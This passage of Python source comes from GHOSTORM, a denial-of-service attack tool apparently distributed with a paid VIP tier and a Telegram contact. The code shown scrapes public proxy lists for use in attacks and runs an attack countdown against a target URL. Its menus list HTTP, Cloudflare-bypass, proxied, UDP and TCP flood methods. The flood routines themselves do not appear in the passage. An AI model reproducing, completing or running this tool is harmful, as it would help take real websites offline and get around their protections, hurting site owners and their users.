                    print('proxy are saved in {}'.format(path))
                    return r
                else:
                    print('You already have a proxy!')
            elif type == "http":
                if not os.path.exists(path):
                    r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
                    r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
                    open(path, 'w').write(r)
                    r = r.rstrip().split('\r\n')
                    print('proxy are saved in {}'.format(path))
                    return r
                else:
                    print('You already have a proxy!')
    def countdown(username, t, threads, vip, owner, url, method):
        until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
        while True:
            if (until - datetime.datetime.now()).total_seconds() > 0:
                stdout.flush()
                stdout.write("\r "+Fore.YELLOW+"(=)"+Fore.WHITE+" Attack status --> " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
            else:
                stdout.flush()
                stdout.write('                                        \r')
                clear()
                a = open('resources/logs/recent.txt', 'r').readline()
                if 'basicmode' in a:
                    logo.main()
                elif 'deltamode' in a:
                    logo.main_delta()
                else:
                    raise("GORMErr: An error occured!")
                after = info.afterburn.starting(username, t, threads, vip, owner, url, method)
                stdout.write(after)
                if 'basicmode' in a:
                    z = main.main()
                elif 'deltamode' in a:
                    z = delta()
                else:
                    raise("GORMErr: An error occured!")
                return z
    class logo:
        def main():
            logo = f"""\033[0m
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    WELCOME TO GHOSTORM
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
            ⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⢀⠄⠂⢉⠤⠐⠋⠈⠡⡈⠉⠐⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  USERNAME : {info.login.username()}
            ⠀⠀⠀⠀⢀⡀⢠⣤⠔⠁⢀⠀⠀⠀⠀⠀⠀⠀⠈⢢⠀⠀ ⠈⠱⡤⣤⠄⣀⠀⠀⠀⠀  OS NAME  : {str(os.name)}
            ⠀⠀⠰⠁⠀⣰⣿⠃⠀⢠⠃⢸⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⢞⣦⡀⠈⡇⠀⠀⠀  VIP      : {info.login.vip()}
            ⠀⠀⠀⢇⣠⡿⠁⠀⢀⡃⠀⣈⠀⠀⠀⠀⢰⡀⠀⠀⠀⠀⢢⠰⠀⠀⢺⣧⢰⠀⠀⠀⠀  OWNER    : {info.login.owner()}
            ⠀⠀⠀⠈⣿⠁⡘⠀⡌⡇⠀⡿⠸⠀⠀⠀⠈⡕⡄⠀⠐⡀⠈⠀⢃⠀⠀⠾⠇⠀⠀⠀⠀  CLASS    : 1
            ⠀⠀⠀⠀⠇⡇⠃⢠⠀⠶⡀⡇⢃⠡⡀⠀⠀⠡⠈⢂⡀⢁⠀⡁⠸⠀⡆⠘⡀⠀⠀⠀⠀  ProductID: {info.get_product.id()}
            ⠀⠀⠀⠸⠀⢸⠀⠘⡜⠀⣑⢴⣀⠑⠯⡂⠄⣀⣣⢀⣈⢺⡜⢣⠀⡆⡇⠀⢣⠀⠀⠀⠀  V        : 0.02.1 (until 1.01.02)
            ⠀⠀⠀⠇⠀⢸⠀⡗⣰⡿⡻⠿⡳⡅⠀⠀⠀⠀⠈⡵⠿⠿⡻⣷⡡⡇⡇⠀⢸⣇⠀⠀⠀  Hostname : {info.ip.hostname()}
            ⠀⠀⢰⠀⠀⡆⡄⣧⡏⠸⢠⢲⢸⠁⠀⠀⠀⠀⠐⢙⢰⠂⢡⠘⣇⡇⠃⠀⠀⢹⡄⠀⠀  IP ADDR  : {info.ip.ipaddr()}
            ⠀⠀⠟⠀⠀⢰⢁⡇⠇⠰⣀⢁⡜⠀⠀⠀⠀⠀⠀⠘⣀⣁⠌⠀⠃⠰⠀⠀⠀⠈⠰⠀⠀  OS USED  : {pf.platform()}
            ⠀⡘⠀⠀⠀⠀⢊⣤⠀⠀⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠄⠀⢸⠃⠀⠀⠀⠀⠀⠃⠀  VIPMethod: {info.method.vip()}
            ⢠⠁⢀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠸⠀  [GHOSTORM]
            ⠘⠸⠘⡀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠁⠀⠃⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⢠⠀⠀⡇  Thanks To: JogjaXploit
            ⠀⠇⢆⢃⠀⠀⠀⠀⠀⡏⢲⢤⢀⡀⠀⠀⠀⠀⠀⢀⣠⠄⡚⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀  Last Updated 20:43 | 08/05/2024
            ⢰⠈⢌⢎⢆⠀⠀⠀⠀⠁⣌⠆⡰⡁⠉⠉⠀⠉⠁⡱⡘⡼⠇⠀⠀⠀⠀⢀⢬⠃⢠⠀⡆  Sign     : [0] = On Progress, [1] = Welldone
            ⠀⢢⠀⠑⢵⣧⡀⠀⠀⡿⠳⠂⠉⠀⠀⠀⠀⠀⠀⠀⠁⢺⡀⠀⠀⢀⢠⣮⠃⢀⠆⡰⠀  Note!    : Put the proxy file in the path resources/logs/ !
            ⠀⠀⠑⠄⣀⠙⡭⠢⢀⡀⠀⠁⠄⣀⣀⠀⢀⣀⣀⣀⡠⠂⢃⡀⠔⠱⡞⢁⠄⣁⠔⠁⠀  Contribut: MrSanZz(Code), Szt00Xploit(ETC), .CREX707(ETC), TOPZ(ETC)
            ⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠉⠁⠀⠀⠀⠀  File Loc : {os.path.realpath(__file__)}
            ⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀  Concurrent  : {info.concurrent.concurrent()}
            """.replace('_internal/2c2.py', '')
            if exists('resources/main_/owner.log'):
                with open('resources/main_/owner.log') as file:
                    owner = file.readline()
                file = owner.strip()
                if 'YES' in file:
                    logo = logo.replace('[GHOSTORM]', 'Secret   : '+info.method.secret())
                else:
                    pass
            logo += '\033[0m'+"╔══════"+'\033[0;33m'+"══════════════════════════════════════════════╗ \n"
            logo += "\t    ║                 "+'\033[0m'+"WELCOME TO GHOSTORM!"+'\033[0;33m'+"               ║ \n"
            logo += "\t    ║            "+'\033[0m'+"Type 'help' to see the command"+'\033[0;33m'+"          ║ \n"
            logo += "\t    ║           "+'\033[0m'+"Contact At Telegram : @MrSanZzXe"+'\033[0;33m'+"         ║ \n"
            logo += "\t    ╚══════════════════════════"+'\033[0m'+"══════════════════════════╝ \n"
            print(logo)
        def help():
            clear()
            logo = f""+'\033[0m'+"\t\t╔══════"+'\033[0;33m'+"════════════════════════════╗ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"Layer7 "+'\033[0;33m'+"       | "+'\033[0m'+"Show Layer7   "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"Layer4 "+'\033[0;33m'+"       | "+'\033[0m'+"Show Layer4   "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"cmdlist "+'\033[0;33m'+"      | "+'\033[0m'+"Show All Tools"+'\033[0;33m'+" ║ \n"
            logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
            print(logo)
        def layer7():
            clear()
            logo = f""+'\033[0m'+"\t\t╔══════"+'\033[0;33m'+"════════════════════════════╗ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"SKY "+'\033[0;33m'+"[1]      | "+'\033[0m'+"Flood Sky Method"+'\033[0;33m'+"║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"PXSKY "+'\033[0;33m'+"[1]    | "+'\033[0m'+"Flood Sky Method"+'\033[0;33m'+"║ \n"
            logo += "\t\t║                | "+'\033[0m'+"With Proxy      "+'\033[0;33m'+"║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"CFB "+'\033[0;33m'+"[1]      | "+'\033[0m'+"CF Bypass      "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"PXSTAR "+'\033[0;33m'+"[1]   | "+'\033[0m'+"PXStar Flood   "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"ION "+'\033[0;33m'+"[1]      | "+'\033[0m'+"Lazer FLOOD    "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"PXCFB "+'\033[0;33m'+"[1]    | "+'\033[0m'+"Proxy CF Flood "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"PXCFPRO "+'\033[0;33m'+"[1]  | "+'\033[0m'+"Proxy CFPRO    "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"PPS "+'\033[0;33m'+"[0]      | "+'\033[0m'+"PPS Flood      "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"CFSOC "+'\033[0;33m'+"[0]    | "+'\033[0m'+"CF Flood Socket"+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"CFPRO "+'\033[0;33m'+"[1]    | "+'\033[0m'+"CF Flood PRO   "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"STRESSERV1"+'\033[0;33m'+"[1]| "+'\033[0m'+"STRESSER V1    "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"STRESSERV2"+'\033[0;33m'+"[1]| "+'\033[0m'+"STRESSER V2    "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"GET "+'\033[0;33m'+"[1]      | "+'\033[0m'+"Flood With     "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║                | "+'\033[0m'+"Get Method      "+'\033[0;33m'+"║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"POST "+'\033[0;33m'+"[1]     | "+'\033[0m'+"Flood With     "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║                | "+'\033[0m'+"Post Method     "+'\033[0;33m'+"║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"HEAD "+'\033[0;33m'+"[1]     | "+'\033[0m'+"Flood With     "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║                | "+'\033[0m'+"Head Method     "+'\033[0;33m'+"║ \n"
            logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
            print(logo)
        def layer4(): #udp tcp tls syn ack esp icmp ssh
            clear()
            logo = f""+'\033[0m'+"\t\t╔══════"+'\033[0;33m'+"════════════════════════════╗ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"UDP "+'\033[0;33m'+"[0]      | "+'\033[0m'+"UDP Flood      "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"TCP "+'\033[0;33m'+"[0]      | "+'\033[0m'+"TCP Flood      "+'\033[0;33m'+" ║ \n"
            logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
            print(logo)
        def cmdl(): #udp tcp tls syn ack esp icmp ssh
            clear()
            logo = f""+'\033[0m'+"\t\t╔══════"+'\033[0;33m'+"════════════════════════════╗ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"getproxy "+'\033[0;33m'+"    | "+'\033[0m'+"Get Proxy      "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"buyvip "+'\033[0;33m'+"      | "+'\033[0m'+"Buy Vip        "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"cls "+'\033[0;33m'+"         | "+'\033[0m'+"Reset page     "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"changeconc "+'\033[0;33m'+"  | "+'\033[0m'+"change concur  "+'\033[0;33m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"delta mode "+'\033[0;33m'+"  | "+'\033[0m'+"Enter delta mod"+'\033[0;33m'+" ║ \n"
            logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
            print(logo)
        def main_delta():
            logo = f"""\033[0m
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    WELCOME TO DELTA MODE
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
            ⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⢀⠄⠂⢉⠤⠐⠋⠈⠡⡈⠉⠐⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  USERNAME : {info.login.username()}
            ⠀⠀⠀⠀⢀⡀⢠⣤⠔⠁⢀⠀⠀⠀⠀⠀⠀⠀⠈⢢⠀⠀ ⠈⠱⡤⣤⠄⣀⠀⠀⠀⠀  OS NAME  : {str(os.name)}
            ⠀⠀⠰⠁⠀⣰⣿⠃⠀⢠⠃⢸⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⢞⣦⡀⠈⡇⠀⠀⠀  VIP      : {info.login.vip()}
            ⠀⠀⠀⢇⣠⡿⠁⠀⢀⡃⠀⣈⠀⠀⠀⠀⢰⡀⠀⠀⠀⠀⢢⠰⠀⠀⢺⣧⢰⠀⠀⠀⠀  OWNER    : {info.login.owner()}
            ⠀⠀⠀⠈⣿⠁⡘⠀⡌⡇⠀⡿⠸⠀⠀⠀⠈⡕⡄⠀⠐⡀⠈⠀⢃⠀⠀⠾⠇⠀⠀⠀⠀  CLASS    : 1
            ⠀⠀⠀⠀⠇⡇⠃⢠⠀⠶⡀⡇⢃⠡⡀⠀⠀⠡⠈⢂⡀⢁⠀⡁⠸⠀⡆⠘⡀⠀⠀⠀⠀  ProductID: {info.get_product.id()}
            ⠀⠀⠀⠸⠀⢸⠀⠘⡜⠀⣑⢴⣀⠑⠯⡂⠄⣀⣣⢀⣈⢺⡜⢣⠀⡆⡇⠀⢣⠀⠀⠀⠀  V        : 0.02.1 (until 1.01.02)
            ⠀⠀⠀⠇⠀⢸⠀⡗⣰⡿⡻⠿⡳⡅⠀⠀⠀⠀⠈⡵⠿⠿⡻⣷⡡⡇⡇⠀⢸⣇⠀⠀⠀  Hostname : {info.ip.hostname()}
            ⠀⠀⢰⠀⠀⡆⡄⣧⡏⠸⢠⢲⢸⠁⠀⠀⠀⠀⠐⢙⢰⠂⢡⠘⣇⡇⠃⠀⠀⢹⡄⠀⠀  IP ADDR  : {info.ip.ipaddr()}
            ⠀⠀⠟⠀⠀⢰⢁⡇⠇⠰⣀⢁⡜⠀⠀⠀⠀⠀⠀⠘⣀⣁⠌⠀⠃⠰⠀⠀⠀⠈⠰⠀⠀  OS USED  : {pf.platform()}
            ⠀⡘⠀⠀⠀⠀⢊⣤⠀⠀⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠄⠀⢸⠃⠀⠀⠀⠀⠀⠃⠀  VIPMethod: {info.method.vip()}
            ⢠⠁⢀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠸⠀  [GHOSTORM]
            ⠘⠸⠘⡀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠁⠀⠃⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⢠⠀⠀⡇  Thanks To: JogjaXploit
            ⠀⠇⢆⢃⠀⠀⠀⠀⠀⡏⢲⢤⢀⡀⠀⠀⠀⠀⠀⢀⣠⠄⡚⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀  Last Updated 20:43 | 08/05/2024
            ⢰⠈⢌⢎⢆⠀⠀⠀⠀⠁⣌⠆⡰⡁⠉⠉⠀⠉⠁⡱⡘⡼⠇⠀⠀⠀⠀⢀⢬⠃⢠⠀⡆  Sign     : [0] = On Progress, [1] = Welldone
            ⠀⢢⠀⠑⢵⣧⡀⠀⠀⡿⠳⠂⠉⠀⠀⠀⠀⠀⠀⠀⠁⢺⡀⠀⠀⢀⢠⣮⠃⢀⠆⡰⠀  Note!    : Put the proxy file in the path resources/logs/ !
            ⠀⠀⠑⠄⣀⠙⡭⠢⢀⡀⠀⠁⠄⣀⣀⠀⢀⣀⣀⣀⡠⠂⢃⡀⠔⠱⡞⢁⠄⣁⠔⠁⠀  Contribut: MrSanZz(Code), Szt00Xploit(ETC), .CREX707(ETC), TOPZ(ETC)
            ⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠉⠁⠀⠀⠀⠀  File Loc : {os.path.realpath(__file__)}
            ⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀  Concurrent  : {info.concurrent.concurrent()}
            """.replace('_internal/2c2.py', '')
            if exists('resources/main_/owner.log'):
                with open('resources/main_/owner.log') as file:
                    owner = file.readline()
                file = owner.strip()
                if 'YES' in file:
                    logo = logo.replace('[GHOSTORM]', 'Secret   : '+info.method.secret())
                else:
                    pass
            logo += '\033[0m'+"╔══════"+'\033[1;35m'+"══════════════════════════════════════════════╗ \n"
            logo += "\t    ║               "+'\033[0m'+"WELCOME TO DELTA MODE!"+'\033[1;35m'+"               ║ \n"
            logo += "\t    ║            "+'\033[0m'+"Type 'help' to see the command"+'\033[1;35m'+"          ║ \n"
            logo += "\t    ║       "+'\033[0m'+"Type : 'basic mode' to return basic mode"+'\033[1;35m'+"     ║ \n"
            logo += "\t    ╚══════════════════════════"+'\033[0m'+"══════════════════════════╝ \n"
            print(logo)
        def help_delta():
            clear()
            logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Layer7 "+'\033[1;35m'+"       | "+'\033[0m'+"Show Layer7   "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"cmdlist "+'\033[1;35m'+"      | "+'\033[0m'+"Show All Tools"+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"basic mode "+'\033[1;35m'+"   | "+'\033[0m'+"Return 1 mode "+'\033[1;35m'+" ║ \n"
            logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
            print(logo)
        def cmdl_delta(): #udp tcp tls syn ack esp icmp ssh
            clear()
            logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"getproxy "+'\033[1;35m'+"    | "+'\033[0m'+"Get Proxy      "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"buyvip "+'\033[1;35m'+"      | "+'\033[0m'+"Buy Vip        "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"cls "+'\033[1;35m'+"         | "+'\033[0m'+"Reset page     "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"changeconc "+'\033[1;35m'+"  | "+'\033[0m'+"change concur  "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"colors "+'\033[1;35m'+"      | "+'\033[0m'+"Change color   "+'\033[1;35m'+" ║ \n"
            logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
            print(logo)
        def colorz_delta(): #udp tcp tls syn ack esp icmp ssh
            clear()
            logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"1           | "+'\033[0m'+"RED            "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"2           | "+'\033[0m'+"YELLOW         "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"3           | "+'\033[0m'+"GREEN          "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"4           | "+'\033[0m'+"BLUE           "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"5           | "+'\033[0m'+"Custom         "+'\033[1;35m'+" ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"reset       | "+'\033[0m'+"Reset color    "+'\033[1;35m'+" ║ \n"
            logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
            print(logo)
        def layer7delta():
            clear()
            logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════╦══════════════════════════╗ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"SKY "+'\033[1;35m'+"[1]            ║ "+'\033[0m'+"Flood Sky Method"+'\033[1;35m'+"         ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXSKY "+'\033[1;35m'+"[1]          ║ "+'\033[0m'+"Flood Sky Method"+'\033[1;35m'+"         ║ \n"
            logo += "\t\t║                      ║ "+'\033[0m'+"With Proxy      "+'\033[1;35m'+"         ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"CFB "+'\033[1;35m'+"[1]            ║ "+'\033[0m'+"CF Bypass      "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXSTAR "+'\033[1;35m'+"[1]         ║ "+'\033[0m'+"PXStar Flood   "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"ION "+'\033[1;35m'+"[1]            ║ "+'\033[0m'+"Lazer FLOOD    "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXCFB "+'\033[1;35m'+"[1]          ║ "+'\033[0m'+"Proxy CF Flood "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXCFPRO "+'\033[1;35m'+"[1]        ║ "+'\033[0m'+"Proxy CFPRO    "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PPS "+'\033[1;35m'+"[0]            ║ "+'\033[0m'+"PPS Flood      "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"CFSOC "+'\033[1;35m'+"[0]          ║ "+'\033[0m'+"CF Flood Socket"+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"CFPRO "+'\033[1;35m'+"[1]          ║ "+'\033[0m'+"CF Flood PRO   "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"STRESSERV1"+'\033[1;35m'+"[1]      ║ "+'\033[0m'+"STRESSER V1    "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"STRESSERV2"+'\033[1;35m'+"[1]      ║ "+'\033[0m'+"STRESSER V2    "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"GET "+'\033[1;35m'+"[1]            ║ "+'\033[0m'+"Flood With Get Method"+'\033[1;35m'+"    ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"POST "+'\033[1;35m'+"[1]           ║ "+'\033[0m'+"Flood With Post Method"+'\033[1;35m'+"   ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"HEAD "+'\033[1;35m'+"[1]           ║ "+'\033[0m'+"Flood With Head Method"+'\033[1;35m'+"   ║ \n"
            logo += f""+'\033[1;35m'+"\t\t╠══════════════════════╬══════════════════════════╣ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXLOWRAW "+'\033[1;35m'+"[1]       ║ "+'\033[0m'+"Flood With Low Junks  "+'\033[1;35m'+"   ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"DeltaSKY "+'\033[1;35m'+"[1]       ║ "+'\033[0m'+"Flood With Delta Sky  "+'\033[1;35m'+"   ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXDeltaSKY "+'\033[1;35m'+"[1]     ║ "+'\033[0m'+"Flood With proxied    "+'\033[1;35m'+"   ║ \n"
            logo += "\t\t║                      ║ "+'\033[0m'+"Delta Sky      "+'\033[1;35m'+"          ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXSpaceD "+'\033[1;35m'+"[1]       ║ "+'\033[0m'+"Flood With proxied"+'\033[1;35m'+"       ║ \n"
            logo += "\t\t║                      ║ "+'\033[0m'+"SpaceD      "+'\033[1;35m'+"             ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"SpaceD "+'\033[1;35m'+"[1]         ║ "+'\033[0m'+"Flood With SpaceD"+'\033[1;35m'+"        ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Freeze[Special] "+'\033[1;35m'+"[1]║ "+'\033[0m'+"Ouu Tralala      "+'\033[1;35m'+"        ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Rage "+'\033[1;35m'+"[1]           ║ "+'\033[0m'+"Bro's Site Mad   "+'\033[1;35m'+"        ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"HttpBurn "+'\033[1;35m'+"[1]       ║ "+'\033[0m'+"New Methods       "+'\033[1;35m'+"       ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Silent "+'\033[1;35m'+"[1]         ║ "+'\033[0m'+"New Methods       "+'\033[1;35m'+"       ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXSilent "+'\033[1;35m'+"[1]       ║ "+'\033[0m'+"New Methods       "+'\033[1;35m'+"       ║ \n"
            logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"Hoshino  "+'\033[1;35m'+"[1]       ║ "+'\033[0m'+"The power of my wife"+'\033[1;35m'+"     ║ \n"
